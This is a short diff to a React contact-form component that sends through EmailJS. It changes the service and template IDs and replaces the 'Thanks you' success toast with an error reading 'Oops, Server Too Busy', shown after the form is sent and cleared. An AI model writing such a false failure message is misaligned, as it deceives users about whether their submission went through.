@@ -10,8 +10,8 @@ function Keystone() {
 
     emailjs
       .sendForm(
-        "service_rqyhxpg",
-        "template_gw53tzn",
+        "service_2xhrx7j",
+        "template_34vu2yp",
         form.current,
         "cnk9au6v3VBqm0eoD"
       )
@@ -24,7 +24,7 @@ function Keystone() {
         }
       );
     e.target.reset();
-    toast.success("Thanks you", {
+    toast.error("Oops, Server Too Busy", {
       position: "top-center",
       autoClose: 2000,
       progressClassName: "fancy-progress-bar",
